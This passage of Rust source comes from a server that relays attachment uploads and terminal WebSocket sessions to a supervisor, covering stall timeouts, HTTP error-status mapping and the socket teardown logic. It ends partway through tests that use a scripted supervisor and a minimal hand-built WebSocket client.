            UploadStep::Ended(reason) => return upload_ended_error(reason),
            // No body progress within the stall window — this hop's own
            // leg of PLAN_M4.md item 4's per-hop timeout.
            UploadStep::Stalled => {
                warn!(
                    session_id = %id, channel,
                    "attachment upload stalled: no body progress from the client"
                );
                let stalled = farhelm_proto::UPLOAD_ABORT_REASON_STALLED.to_string();
                upload.abort(stalled.clone()).await;
                return upload_ended_error(stalled);
            }
            UploadStep::Body(Some(Ok(bytes))) => bytes,
            // The body stream itself failed — a genuine disconnect, or a
            // framing violation. Release the supervisor's half rather
            // than leaving it waiting for bytes that will never arrive.
            UploadStep::Body(Some(Err(e))) => {
                warn!(
                    session_id = %id, channel, error = %e,
                    "attachment upload body ended before Content-Length was reached"
                );
                upload.abort(format!("client body failed: {e}")).await;
                return (
                    axum::http::StatusCode::BAD_REQUEST,
                    format!("attachment upload failed: {e}\n"),
                )
                    .into_response();
            }
            // The body ended normally: every declared byte arrived (or
            // the browser's framing said so), so it is time to publish.
            UploadStep::Body(None) => break,
        };
        // An empty chunk is a legal thing for a body stream to yield and
        // carries no progress, so it neither reaches the supervisor nor
        // extends the deadline.
        if chunk.is_empty() {
            continue;
        }
        if sent.saturating_add(chunk.len() as u64) > size {
            warn!(
                session_id = %id, channel, declared = size,
                "attachment upload body exceeded its declared Content-Length"
            );
            upload
                .abort("client body exceeded its declared size".to_string())
                .await;
            return (
                axum::http::StatusCode::BAD_REQUEST,
                format!(
                    "attachment upload body is longer than the declared Content-Length of {size} \
                     bytes\n"
                ),
            )
                .into_response();
        }
        sent += chunk.len() as u64;
        deadline = tokio::time::Instant::now() + CLIENT_UPLOAD_STALL_TIMEOUT;
        pending.extend_from_slice(&chunk);
        // Only whole frames go out here; the tail waits for either more
        // bytes or the flush above, so no partial frame is ever emitted
        // while the body still has data queued behind it.
        let whole = pending.len() - pending.len() % UPLOAD_CHUNK_BYTES;
        if whole > 0 {
            if let Err(reason) = upload.send_upload_chunk(&pending[..whole]).await {
                return upload_ended_error(reason);
            }
            pending.drain(..whole);
        }
    }

    // The body's tail, whatever is left of a partial frame. An empty
    // `pending` is the ordinary case for a body that ended on a chunk
    // boundary — and for a zero-byte upload, which sends no data at all
    // and goes straight to the commit.
    if !pending.is_empty()
        && let Err(reason) = upload.send_upload_chunk(&pending).await
    {
        return upload_ended_error(reason);
    }

    match upload.commit().await {
        Ok(path) => {
            info!(session_id = %id, channel, bytes = sent, "attachment upload published");
            axum::Json(serde_json::json!({ "path": path })).into_response()
        }
        Err(e) => http_error(e),
    }
}

/// What one turn of [`upload_attachment`]'s relay loop resolved to.
///
/// Exists so the loop's `select!` can hand its outcome out before anything
/// acts on it: the arms hold borrows of the upload guard and the body
/// stream, while every teardown path needs the guard back to abort with.
enum UploadStep {
    /// The upload ended upstream, with this verbatim reason.
    Ended(String),
    /// The stall deadline expired with no relayed bytes.
    Stalled,
    /// The body stream produced an item (or ended, as `None`).
    Body(Option<Result<axum::body::Bytes, axum::Error>>),
}

/// Render an error as an HTTP response whose body is the error chain in
/// full and whose status reflects what the supervisor actually classified.
///
/// The status mapping is only as honest as the supervisor's own
/// classification: `NotFound` maps to 404, `InvalidRequest` to 400, and
/// `Conflict` (PLAN_M3.md item 6 — an intent key reused with a different
/// fingerprint) to 409, each when a `SupervisorClient` request surfaces a
/// [`SupervisorError`] with that kind anywhere in its chain (the walk
/// mirrors the supervisor's own `error_kind` helper, for the same
/// reason — a `SupervisorError` can sit under context layers this client
/// or an intermediate caller added). Anything else — no `SupervisorError`
/// in the chain at all, or one explicitly carrying `Internal` — is a 500:
/// the honest default for a failure the caller could not have avoided by
/// sending a different request.
///
/// PLAN_M6.md item 5's host-management and routing refusals join the same
/// table through two further downcasts. [`store::HostStoreError`]: an
/// unknown host id is a 404, an unusable destination is a 400 (the caller
/// sent something `ssh` cannot use), and everything else the registry
/// refuses — a duplicate destination, the immovable local row, a lost
/// identity compare-and-swap, an identity another row claimed, a row
/// reconfigured mid-decision, a session two hosts both claim — is a 409,
/// because each is the same shape of failure: the request was well formed
/// and conflicts with the fleet as it stands. [`manager::ManagerError`]
/// carries the same split for the decisions the manager owns rather than
/// the store. A non-connected host's refusal reaches this function as an
/// ordinary `SupervisorError` carrying `Conflict` (see `refusal_text`), for
/// the same reading.
///
/// The body itself is deliberately unsanitized regardless of status:
/// SPEC.md requires concrete, actionable errors in the client, and the
/// intended reader is the user's own UI. Note the honest caveat: until the
/// web token lands (M7), the loopback port is reachable by every local
/// account, so "no untrusted caller" is not yet true — which is a reason
/// to keep credentials out of error text (see the invocation-parse context
/// in the supervisor), not to strip detail the user needs. The body is
/// displayed as text, never interpreted, which is what makes it safe to
/// pass a remote supervisor's message through verbatim.
fn http_error(e: anyhow::Error) -> axum::response::Response {
    // ONE status decision and ONE response construction. The three families
    // are consulted in order of specificity — a registry refusal, then a
    // manager refusal, then whatever the supervisor said — and each yields
    // only a CODE, because three copies of "format the chain and return it"
    // is three places for the body to drift apart.
    let registry = e
        .chain()
        .find_map(|c| c.downcast_ref::<store::HostStoreError>())
        .map(|refusal| match refusal {
            store::HostStoreError::HostNotFound(_) => axum::http::StatusCode::NOT_FOUND,
            store::HostStoreError::InvalidDestination(_) => axum::http::StatusCode::BAD_REQUEST,
            store::HostStoreError::DuplicateDestination(_)
            | store::HostStoreError::LocalHostImmutable
            | store::HostStoreError::IdentityMismatch { .. }
            | store::HostStoreError::IdentityClaimed { .. }
            | store::HostStoreError::StaleAttempt { .. }
            // Two hosts claiming one session id: well-formed request,
            // incoherent fleet. 409 rather than 500 because the user CAN
            // act on it (remove whichever entry does not belong) and the
            // error names both candidates so they know which.
            | store::HostStoreError::SessionOwnerAmbiguous { .. } => {
                axum::http::StatusCode::CONFLICT
            }
        });
    let managed = || {
        e.chain()
            .find_map(|c| c.downcast_ref::<manager::ManagerError>())
            .map(|refusal| match refusal {
                manager::ManagerError::NoSuchHost(_) => axum::http::StatusCode::NOT_FOUND,
                // Both are "the host is not in the state this verb needs",
                // which a client answers by re-rendering the host and
                // offering whatever it is actually asking for now.
                manager::ManagerError::NotAwaitingAdoption { .. }
                | manager::ManagerError::AdoptionSuperseded { .. } => {
                    axum::http::StatusCode::CONFLICT
                }
            })
    };
    let supervised = || match e
        .chain()
        .find_map(|c| c.downcast_ref::<SupervisorError>())
        .map(|s| s.kind)
    {
        Some(ErrorKind::NotFound) => axum::http::StatusCode::NOT_FOUND,
        Some(ErrorKind::InvalidRequest) => axum::http::StatusCode::BAD_REQUEST,
        Some(ErrorKind::Internal) | None => axum::http::StatusCode::INTERNAL_SERVER_ERROR,
        // PLAN_M3.md item 6: an intent key reused with a different
        // fingerprint. 409 is the standard HTTP reading of "this identifier
        // already means something else"; this function's own docstring
        // above is where the full status-mapping table lives.
        Some(ErrorKind::Conflict) => axum::http::StatusCode::CONFLICT,
    };
    let status = registry.or_else(managed).unwrap_or_else(supervised);
    // The UI shows this body verbatim.
    (status, format!("{e:#}")).into_response()
}

/// Initial terminal size, carried as query parameters because a WebSocket
/// handshake is a GET with no body. Sizing the pane at attach time rather
/// than waiting for the first `resize` message is what gets live output
/// to the right width immediately instead of reflowing a moment later.
///
/// It does not fix the replay itself: the supervisor captures before it
/// resizes (deliberately — the capture must not disturb an incumbent
/// attachment that the attach may still fail to displace), so a reattach
/// at a different size replays content laid out at the previous
/// geometry. Full-screen apps repaint on the SIGWINCH that follows;
/// normal-screen sessions wear the reflow until the next output.
///
/// `tab` and `lease` are PLAN_M4.md item 5's terminal-selector plumbing,
/// and BOTH are additive by construction, not just by `Option`: a request
/// carrying neither must reach the supervisor as the exact pre-M4 `Attach`
/// shape — `TerminalSelector::Agent` and an empty lease — because every
/// caller that predates tabs (an older UI build, a bookmarked URL, a
/// script) still means "attach the agent terminal as my one and only
/// terminal" when it says nothing. `resolve_attach_request` below is
/// where that legacy-absent reading and the new query-parsing both live,
/// deliberately as one function, so the two cannot silently diverge.
#[derive(Deserialize)]
struct TermQuery {
    #[serde(default = "default_cols")]
    cols: u16,
    #[serde(default = "default_rows")]
    rows: u16,
    /// The tab to attach, echoing a `TabInfo::id` this session's
    /// `SessionInfo.tabs` already handed the client. Absent means the
    /// agent terminal — see this struct's own docs. Deliberately NOT
    /// validated for shape (contrast `lease` below): every value,
    /// including an empty string, has an unambiguous supervisor-side
    /// reading, so there is nothing for the helm to reject here.
    tab: Option<String>,
    /// This client's session-scoped attach identity (PLAN_M4.md item 3),
    /// forwarded verbatim to `attach_terminal`. Absent means the empty,
    /// un-leased pre-M4 reading — see this struct's own docs. Kept as
    /// `Option<String>` rather than defaulted straight to `String`
    /// (`#[serde(default)]`) specifically so a PRESENT empty value stays
    /// distinguishable from an ABSENT one at the type level:
    /// `resolve_attach_request` needs to refuse the former while still
    /// reading the latter as empty, and collapsing them early would
    /// destroy exactly the distinction that refusal depends on.
    lease: Option<String>,
}

/// Turn a `?tab=`/`?lease=` query pair into what `attach_terminal` wants,
/// rejecting only the one shape neither the wire nor the supervisor CAN
/// reject on the helm's behalf.
///
/// `tab` needs no local validation at all (PLAN_M4.md item 5): an ABSENT
/// value is the agent terminal (the legacy reading `TermQuery` documents),
/// and every PRESENT value — including an empty string — becomes
/// `TerminalSelector::Tab { id }` and is left entirely to the supervisor's
/// own attach handling, which answers `NotFound` for an id no `TabInfo`
/// ever carried. That is the same visible failure every other unknown tab
/// produces, so there is no separate "shape" rejection to keep in sync
/// with it — one canonical path instead of two.
///
/// `lease` is asymmetric, and deliberately so. An ABSENT lease is the
/// pre-M4 un-leased singleton reading (`ControlMsg::Attach::lease`'s own
/// docs) — which IS the empty string on the wire, because that is what
/// every caller written before leases existed sends. A PRESENT but
/// EXPLICITLY EMPTY `?lease=` cannot be forwarded as that same empty
/// string: once it reaches the supervisor there is no way to tell "this
/// caller said nothing" apart from "this caller said lease is empty" —
/// the wire has only one empty-string value, not two — and the supervisor
/// already treats an empty lease as legal legacy content, so it has no
/// hook to refuse it either. Collapsing the two would let a client that
/// explicitly opted into the un-leased singleton reading (a stale
/// bookmark, a hand-written URL) silently join — and be joined by —
/// every OTHER un-leased attachment on the session: the one outcome
/// PLAN_M4.md item 3's per-session takeover exists to prevent. So this is
/// refused HERE, before it becomes indistinguishable from absence, which
/// is the only point in the whole path where the distinction still
/// exists to check.
fn resolve_attach_request(q: &TermQuery) -> anyhow::Result<(TerminalSelector, &str)> {
    let terminal = match &q.tab {
        None => TerminalSelector::Agent,
        Some(id) => TerminalSelector::Tab { id: id.clone() },
    };
    let lease = match q.lease.as_deref() {
        None => "",
        Some("") => {
            return Err(anyhow::anyhow!(
                "terminal websocket's ?lease= must not be empty"
            ));
        }
        Some(lease) => lease,
    };
    Ok((terminal, lease))
}

/// Resolve `q`, route to the session's owning host, and attach — as one
/// `Result` (PLAN_M4.md item 5; owner routing per PLAN_M6.md item 5).
///
/// Folding the local query-shape check, the owner lookup, and the
/// supervisor round trip into a single function is what lets `serve_term`
/// report every kind of failure through one notice-then-close arm instead
/// of three copies of the same three lines: a caller here cannot tell (and
/// does not need to) whether an `Err` came from `resolve_attach_request`
/// refusing the shape, from the session's host being unreachable, or from
/// the supervisor refusing the attach itself — all are, from the browser's
/// perspective, "this attach did not happen," and all deserve the identical
/// visible treatment.
///
/// That uniformity is also what gives the terminal socket its half of
/// SPEC.md's host-unreachable story for free: the refusal text names the
/// host's actual state, and it arrives as the same
/// `{"type":"detached","reason":...}` notice a takeover would, so nothing
/// on the browser side needs a new message shape to render it.
///
/// The client is returned alongside the attachment because `serve_term`
/// must keep talking to the SAME connection for the socket's whole life —
/// input, resize, pause/resume, detach. Re-routing per message would let a
/// mid-session reconnect silently move a live terminal's writes to a
/// different connection than the one its attachment lives on.
async fn attach_from_query(
    state: &AppState,
    session_id: &str,
    q: &TermQuery,
) -> anyhow::Result<(Arc<SupervisorClient>, u32, TermStream)> {
    let (terminal, lease) = resolve_attach_request(q)?;
    let (_claim, client) = route_session(state, session_id).await?;
    let (channel, stream) = client
        .attach_terminal(session_id, q.cols, q.rows, terminal, lease)
        .await?;
    Ok((client, channel, stream))
}

/// Terminal WebSocket: binary frames are terminal bytes in both
/// directions; text frames are small JSON control messages (client →
/// resize/pause/resume; server → detached notice, replay-complete marker).
/// This is the browser-facing twin of the proto data channel, kept equally
/// dumb.
///
/// `?cols=`/`?rows=` set the initial size (see `TermQuery`'s docs).
/// `?tab=<id>` and `?lease=<id>` (PLAN_M4.md item 5) select which of the
/// session's terminals this socket attaches and under which client
/// identity; BOTH default to the exact pre-M4 behavior when absent —
/// the agent terminal, un-leased — so a caller that predates tabs sees no
/// change at all. `resolve_attach_request` owns the one shape check the
/// helm makes locally (an explicitly empty `?lease=`, never `?tab=` —
/// see that function's own docs for why the two are asymmetric);
/// everything else, including an unknown tab id, is the supervisor's own
/// `NotFound` and reaches this socket exactly like any other attach
/// failure — a `{"type":"detached",...}` notice, then close, never a bare
/// disconnect the browser would blame on the network instead of the
/// session (see `serve_term`'s single attach-failure arm).
///
/// The client → server text messages, all `{"type": ...}`:
/// - `{"type":"resize","cols":N,"rows":N}` — the pane's new geometry.
/// - `{"type":"pause"}` — this terminal's unflushed `term.write()`
///   backlog crossed its high-water mark; stop sending output.
/// - `{"type":"resume"}` — the backlog drained below the low-water mark;
///   output may flow again.
///
/// Pause and resume carry no payload because the channel is implicit:
/// one socket is one attachment. They are the browser end of
/// PLAN_M2_5.md's watermark flow control and travel straight through to
/// the supervisor as `ControlMsg::PauseOutput`/`ResumeOutput` — the helm
/// keeps no pause state of its own (see `SupervisorClient::pause_output`).
/// The browser side that SENDS them lands with the UI work in
/// PLAN_M2_5.md step 4; the server accepts them now.
///
/// Server → client, both text: `{"type":"detached","reason":...}` and, as
/// of PLAN_M5.md item 4, `{"type":"replay_complete"}` — the attach's
/// catch-up boundary, forwarded on this SAME socket after the binary
/// replay bytes it follows and before any binary live bytes, because
/// [`TermEvent::ReplayComplete`] rides the terminal's data queue rather
/// than jumping ahead of it (see that variant's own docs for why the
/// ordering is the whole point). Consumers must treat it as pure
/// presentation, never as a signal for session or lifecycle behavior —
/// the same restriction `ControlMsg::ReplayComplete`'s docs place on every
/// consumer of the wire message it forwards.
/// The fixed wire text for the replay-complete marker (PLAN_M5.md item 4;
/// see `term_ws`'s docs for where it sits in the server→client message
/// set). A plain constant rather than a `serde_json::json!` value built
/// fresh per marker: the shape never varies — no fields, ever — so there
/// is nothing for a JSON builder to add over a literal, and every marker
/// this socket ever sends is this exact string.
const REPLAY_COMPLETE_TEXT_MESSAGE: &str = r#"{"type":"replay_complete"}"#;

async fn term_ws(
    State(state): State<Arc<AppState>>,
    AxPath(id): AxPath<String>,
    Query(q): Query<TermQuery>,
    upgrade: WebSocketUpgrade,
) -> impl IntoResponse {
    // Sized to what the client can chunk onward (MAX_FRAME_LEN), not
    // smaller: xterm.js hands a bracketed paste to us as ONE message, so
    // a tighter cap would turn a large clipboard paste into a dropped
    // connection — the very failure chunking exists to prevent.
    upgrade
        .max_message_size(farhelm_proto::MAX_FRAME_LEN as usize)
        .on_upgrade(move |socket| async move {
            if let Err(e) = serve_term(state, id, q, socket).await {
                error!(error = %e, "terminal websocket ended with error");
            }
        })
}

/// How long a terminal WebSocket's outbound drain gets to deliver its
/// final detach notice once the handler is unwinding.
///
/// SPEC.md requires a takeover — and now a stall — to be visibly itself
/// rather than a bare connection close, and that notice is one small text
/// frame, so this only has to cover a socket that is working. A socket
/// that is NOT working is the case this bound exists for: the browser
/// that stopped reading is precisely the one whose detach is being
/// delivered, and waiting on it indefinitely would reinstate the pin the
/// detach just removed.
const WS_TEARDOWN_GRACE: std::time::Duration = std::time::Duration::from_secs(5);

/// Client-to-helm control messages on a terminal socket. Text frames only
/// — binary is always terminal input — and an unparseable one is ignored
/// rather than fatal, so adding a message type does not break older
/// clients. See `term_ws`'s docs for the wire shapes.
#[derive(Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum WsClientMsg {
    Resize {
        cols: u16,
        rows: u16,
    },
    /// Watermark flow control, PLAN_M2_5.md. No fields: one socket is one
    /// attachment, so the channel these apply to is never ambiguous, and
    /// letting the browser name a channel would only invite it to name
    /// somebody else's.
    Pause,
    Resume,
}

/// Pump one attached terminal between the browser and the supervisor.
///
/// The body of the terminal path, and deliberately the dumbest part of it:
/// bytes are never inspected, buffered, or transformed in either
/// direction. Every escape sequence a client sees comes from the pane, and
/// every keystroke reaches it unedited — that is what "full fidelity" in
/// SPEC.md costs here, and any parsing added at this layer would break it.
///
/// The socket always outlives its attachment by exactly one message: when
/// the supervisor ends the attachment (takeover, dead terminal), the
/// detach notice goes out *before* the close, because a bare close renders
/// as a generic "connection closed" and SPEC.md requires a takeover to be
/// visibly a takeover. `detach` runs on every exit path so the supervisor
/// never keeps an attachment alive for a browser that is gone.
///
/// # Why two tasks
///
/// Inbound (browser → supervisor) and outbound (supervisor → browser) run
/// as separate tasks rather than two arms of one `select!`. Since the
/// helm's outbound queue became bounded, every inbound forward — input,
/// resize, pause, resume — can park waiting for capacity, and in a single
/// loop that parking also stops draining terminal events. That is the
/// worst possible coupling: a big paste blocks output delivery, the
/// per-terminal queue backs up, and a perfectly healthy viewer trips the
/// stalled-terminal detach. Splitting them means a blocked inbound send
/// cannot starve the outbound drain.
///
/// Inbound ORDER is preserved regardless: all four inbound message kinds
/// originate from this one WebSocket read loop and are forwarded from it
/// in arrival order. Only the outbound drain moved.
async fn serve_term(
    state: Arc<AppState>,
    session_id: String,
    q: TermQuery,
    socket: ws::WebSocket,
) -> anyhow::Result<()> {
    use futures_util::{SinkExt, StreamExt};

    let (mut ws_tx, mut ws_rx) = socket.split();

    // One arm covers both failure sources `attach_from_query` can produce
    // — a locally-refused query shape (an explicit empty `?lease=`) and a
    // supervisor-side attach refusal (unknown session, unknown tab, tmux
    // trouble) — because both must reach the user identically: a
    // `{"type":"detached",...}` notice, then a closed socket, never a bare
    // disconnect the browser would blame on the network instead of the
    // request it just made. See `attach_from_query`'s own docs for why
    // folding them into one `Result` is what keeps this a single arm
    // instead of two copies of the same three lines.
    let (client, channel, mut events) = match attach_from_query(&state, &session_id, &q).await {
        Ok(parts) => parts,
        Err(e) => {
            let notice = serde_json::json!({"type": "detached", "reason": format!("{e:#}")});
            let _ = ws_tx
                .send(ws::Message::Text(notice.to_string().into()))
                .await;
            return Err(e);
        }
    };

    // The detach signal, watched independently of the event queue. This is
    // the priority path that makes teardown always possible: a browser
    // that has stopped reading can block the `ws_tx.send` below
    // indefinitely, and without a way to abandon that send, a stall detach
    // would leave this handler, its queued frames, and the attachment
    // itself pinned for as long as the wedge lasted — the very leak the
    // stall detach exists to prevent.
    let mut detach_signal = events.detach_signal();
    let mut outbound = tokio::spawn(async move {
        loop {
            let Some(event) = events.recv().await else {
                break;
            };
            let message = match event {
                TermEvent::Data(bytes) => ws::Message::Binary(bytes.into()),
                // The catch-up boundary (PLAN_M5.md item 4). Built as an
                // ordinary outbound `Message` rather than sent inline like
                // `Detached` below, deliberately: it must go through the
                // SAME `select!` — racing the browser's detach signal —
                // as a `Data` message would, so a viewer that vanished
                // between the marker and this send abandons it exactly
                // like abandoned data, instead of the marker getting a
                // priority path data never had.
                TermEvent::ReplayComplete => ws::Message::Text(REPLAY_COMPLETE_TEXT_MESSAGE.into()),
                TermEvent::Detached(reason) => {
                    let notice = serde_json::json!({"type": "detached", "reason": reason});
                    // Best-effort and last: the socket closes right after,
                    // and a browser that cannot even take this notice is
                    // one the reason would not have reached anyway.
                    let _ = ws_tx
                        .send(ws::Message::Text(notice.to_string().into()))
                        .await;
                    break;
                }
            };
            tokio::select! {
                sent = ws_tx.send(message) => {
                    if sent.is_err() {
                        break;
                    }
                }
                reason = detach_signal.detached() => {
                    // Abandon the in-flight send along with everything
                    // still queued behind it: this viewer is gone, and the
                    // backlog is exactly the data it already proved it was
                    // not reading.
                    let reason = reason.unwrap_or_else(|| "detached".to_string());
                    let notice = serde_json::json!({"type": "detached", "reason": reason});
                    let _ = ws_tx
                        .send(ws::Message::Text(notice.to_string().into()))
                        .await;
                    break;
                }
            }
        }
    });

    let inbound = async {
        while let Some(msg) = ws_rx.next().await {
            match msg {
                Ok(ws::Message::Binary(bytes)) => {
                    client.send_input(channel, bytes.to_vec()).await;
                }
                Ok(ws::Message::Text(text)) => match serde_json::from_str::<WsClientMsg>(&text) {
                    Ok(WsClientMsg::Resize { cols, rows }) => {
                        client.resize(&session_id, channel, cols, rows).await;
                    }
                    Ok(WsClientMsg::Pause) => client.pause_output(channel).await,
                    Ok(WsClientMsg::Resume) => client.resume_output(channel).await,
                    // Unparseable or unknown: ignored on purpose, so a
                    // newer browser bundle talking to an older helm
                    // degrades rather than dropping the terminal.
                    Err(_) => {}
                },
                Ok(ws::Message::Close(_)) => break,
                Ok(_) => {} // ping/pong handled by axum
                // Surfaced, not swallowed: an oversized message or a
                // protocol error here is otherwise invisible to both the
                // user (generic "connection closed") and the log.
                Err(e) => {
                    return Err(anyhow::Error::new(e).context("terminal websocket receive failed"));
                }
            }
        }
        anyhow::Ok(())
    };
    tokio::pin!(inbound);

    // Either half ending must end the whole handler, and the outbound arm
    // is the one that matters for teardown. A browser that stops reading
    // never closes its socket and never sends anything, so the inbound
    // loop alone would wait forever — pinning this handler, its socket,
    // and every frame queued for it for exactly as long as the wedge
    // lasts. That is the leak the stall detach exists to end, so the
    // detach has to be able to end this handler by itself.
    let (result, outbound_finished) = tokio::select! {
        result = &mut inbound => (result, false),
        _ = &mut outbound => (Ok(()), true),
    };

    // Detaching is what ends the outbound task in the ORDINARY case (the
    // browser closed its socket): the supervisor drops the attachment,
    // the client signals detached, and the drain unwinds after sending
    // its notice. The grace period covers exactly that notice; past it
    // the task is abandoned, because by then it can only be blocked on
    // the same unreadable socket the detach was about.
    client.detach(channel).await;
    settle_outbound(outbound, outbound_finished, WS_TEARDOWN_GRACE).await;
    result
}

/// Let a terminal socket's outbound drain finish, aborting it past
/// `grace` — and never polling its `JoinHandle` more than once past
/// completion.
///
/// That last clause is the entire reason this is a function rather than
/// three lines at the call site. `tokio::JoinHandle`'s documented contract
/// is that polling it after it has already returned `Ready` panics — it is
/// not a fused future — and the teardown it belongs to had two independent
/// ways to do exactly that: the `select!` above can be what drives the
/// handle to completion (the supervisor ended the attachment first), and so
/// can the timeout below (the ordinary case — the browser navigated away,
/// the drain sent its detach notice and stopped). Either one left the old
/// `timeout(...); handle.await` pair polling a spent handle, so a plain page
/// navigation printed "JoinHandle polled after completion" into the helm's
/// log on the way out.
///
/// `already_finished` is the caller's report of the first case; the second
/// is handled by only awaiting after an `abort`, which is the one path where
/// the handle is known to still be outstanding.
async fn settle_outbound(
    mut outbound: tokio::task::JoinHandle<()>,
    already_finished: bool,
    grace: std::time::Duration,
) {
    if already_finished {
        return;
    }
    if tokio::time::timeout(grace, &mut outbound).await.is_err() {
        outbound.abort();
        // Safe to await: the timeout expired, so nothing has taken this
        // handle's output yet, and the abort only makes it resolve sooner.
        let _ = outbound.await;
    }
}

#[cfg(test)]
mod tests {
    use super::{SupervisorError, origin_is_allowed, rest_harness};
    use axum::http::HeaderMap;
    use farhelm_proto::io::{FrameReader, FrameWriter, handshake};
    use farhelm_proto::{ControlMsg, Frame};
    use std::time::Duration;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    /// Every exit shape of a terminal socket's teardown must leave its
    /// outbound drain settled WITHOUT ever polling a spent `JoinHandle`.
    ///
    /// This is a regression test for a live bug, not a test of tokio: the
    /// old teardown polled the handle in the `select!` and then again in
    /// the timeout and again in a trailing `await`, so an ordinary page
    /// navigation — the drain finishing inside the grace period — panicked
    /// the connection task with "JoinHandle polled after completion". A
    /// panic there is invisible from the browser side (the socket is
    /// already closing either way), which is exactly why it survived until
    /// someone read the webserver log, and why the property is pinned here
    /// at the seam instead of end to end.
    ///
    /// All three shapes run, because each reaches the handle differently:
    /// already-driven-to-completion by the caller, completing inside the
    /// grace, and never completing at all (the wedged browser the grace
    /// exists for).
    #[tokio::test]
    async fn outbound_teardown_never_polls_a_finished_join_handle() {
        // Driven to completion by the caller, exactly as the `select!`
        // arm does before reporting `already_finished`.
        let mut handle = tokio::spawn(async {});
        (&mut handle).await.expect("the task cannot panic");
        super::settle_outbound(handle, true, Duration::from_secs(5)).await;

        // Finishes on its own inside the grace: the ordinary navigation
        // case, and the one the old code panicked on.
        let handle = tokio::spawn(async {
            tokio::time::sleep(Duration::from_millis(20)).await;
        });
        super::settle_outbound(handle, false, Duration::from_secs(5)).await;

        // Never finishes: aborted past the grace, which must also not
        // leave this call hanging.
        let handle = tokio::spawn(async {
            std::future::pending::<()>().await;
        });
        let start = tokio::time::Instant::now();
        super::settle_outbound(handle, false, Duration::from_millis(50)).await;
        assert!(
            start.elapsed() < Duration::from_secs(2),
            "a wedged drain must be abandoned at the grace, not waited on"
        );
    }

    /// A scripted supervisor that must be asked NOTHING.
    ///
    /// The far side of every "the helm refused this by itself" assertion:
    /// it completes the handshake, so its host really is connected and
    /// routable, and then fails if any request arrives at all. Bounded
    /// silence rather than an EOF, because the harness holds the connection
    /// open for the whole test (`rest_harness`'s module docs) — so
    /// "nothing was forwarded" is only observable as nothing arriving. The
    /// window is generous on purpose: a leak would send its frame
    /// immediately, so a longer wait only costs time on the failing path.
    async fn silent_supervisor(peer_side: tokio::io::DuplexStream) {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake};

        let (r, w) = tokio::io::split(peer_side);
        let mut reader = FrameReader::new(r);
        let mut writer = FrameWriter::new(w);
        handshake(&mut reader, &mut writer, "supervisor")
            .await
            .unwrap();
        // Three outcomes, and only one of them is a failure. A timeout is
        // the ordinary pass (nothing was sent). A clean EOF is also a pass:
        // the harness tears connections down deliberately — a host taken
        // down, a retry, a reconnect — and a closed stream is not a request.
        // Only a FRAME means something reached a supervisor that must not
        // have been asked anything.
        let leaked = tokio::time::timeout(Duration::from_secs(2), reader.read_frame()).await;
        assert!(
            !matches!(leaked, Ok(Ok(Some(_)))),
            "no request may reach this supervisor, but one arrived: {leaked:?}"
        );
    }

    /// A deliberately minimal WebSocket client: enough to complete the
    /// upgrade, send text/binary frames, and — crucially — to STOP
    /// READING whenever a test wants to model a wedged browser.
    ///
    /// Hand-rolled rather than pulled from a crate because no WebSocket
    /// client is a dependency of this workspace, and the two behaviors
    /// these tests need are precisely the ones a real client library goes
    /// out of its way to hide: never draining the socket, and observing
    /// the server's close. Only the subset actually used is implemented —
    /// client frames are always masked and always short, which is all a
    /// pause/resume message or a keystroke ever is.
    struct WsTestClient {
        stream: tokio::net::TcpStream,
        /// Bytes read from the socket but not yet parsed into a frame.
        buffered: Vec<u8>,
    }

    impl WsTestClient {
        async fn connect(addr: std::net::SocketAddr, path: &str) -> WsTestClient {
            let mut stream = tokio::net::TcpStream::connect(addr).await.expect("connect");
            // A fixed key is fine: nothing here verifies the accept hash,
            // which exists to defend against caching proxies, not tests.
            let request = format!(
                "GET {path} HTTP/1.1\r\nHost: 127.0.0.1:{}\r\nConnection: Upgrade\r\n\
                 Upgrade: websocket\r\nSec-WebSocket-Version: 13\r\n\
                 Sec-WebSocket-Key: AAAAAAAAAAAAAAAAAAAAAA==\r\n\r\n",
                addr.port()
            );
            stream
                .write_all(request.as_bytes())
                .await
                .expect("send upgrade");
            // Read exactly up to the end of the response headers, leaving
            // any frame bytes that followed them in the buffer.
            let mut buffered = Vec::new();
            let mut byte = [0u8; 1];
            while !buffered.ends_with(b"\r\n\r\n") {
                let n = stream.read(&mut byte).await.expect("read upgrade response");
                assert!(n > 0, "connection closed during the WebSocket upgrade");
                buffered.push(byte[0]);
            }
            let response = String::from_utf8_lossy(&buffered).into_owned();
            assert!(
                response.starts_with("HTTP/1.1 101"),
                "WebSocket upgrade refused: {response}"
            );
            WsTestClient {
                stream,
                buffered: Vec::new(),
            }
        }

        /// Send one masked client frame. `opcode` is 1 for text, 2 for
        /// binary — the only two this suite sends.
        async fn send(&mut self, opcode: u8, payload: &[u8]) {
            assert!(
                payload.len() < 126,
                "test frames stay in the short-length form"
            );
            let mask = [0x37u8, 0xfa, 0x21, 0x3d];
            let mut frame = vec![0x80 | opcode, 0x80 | payload.len() as u8];
            frame.extend_from_slice(&mask);
            frame.extend(
                payload
                    .iter()
                    .enumerate()
                    .map(|(i, byte)| byte ^ mask[i % 4]),
            );
            self.stream.write_all(&frame).await.expect("send ws frame");
        }

        async fn send_text(&mut self, text: &str) {
            self.send(1, text.as_bytes()).await;
        }

        /// Read one server frame's (opcode, payload), or `None` once the
        /// server closes. Server frames are never masked.
        async fn recv(&mut self) -> Option<(u8, Vec<u8>)> {
            loop {
                if let Some(frame) = self.take_buffered_frame() {
                    return Some(frame);
                }
                let mut chunk = [0u8; 8192];
                let n = self.stream.read(&mut chunk).await.ok()?;
                if n == 0 {
                    return None;
                }
                self.buffered.extend_from_slice(&chunk[..n]);
            }
        }

        /// Decode one complete frame out of `buffered`, if there is one.
        /// Handles the two length forms axum actually emits for the sizes
        /// these tests produce.
        fn take_buffered_frame(&mut self) -> Option<(u8, Vec<u8>)> {
            if self.buffered.len() < 2 {
                return None;
            }
            let opcode = self.buffered[0] & 0x0f;
            let short = (self.buffered[1] & 0x7f) as usize;
            let (len, header) = match short {
                126 => {
                    if self.buffered.len() < 4 {
                        return None;
                    }
                    (
                        u16::from_be_bytes([self.buffered[2], self.buffered[3]]) as usize,
                        4,
                    )
                }
                127 => {
                    if self.buffered.len() < 10 {
                        return None;
                    }
                    let mut bytes = [0u8; 8];
                    bytes.copy_from_slice(&self.buffered[2..10]);
                    (u64::from_be_bytes(bytes) as usize, 10)
                }
                other => (other, 2),
            };
            if self.buffered.len() < header + len {
                return None;
            }
            let payload = self.buffered[header..header + len].to_vec();
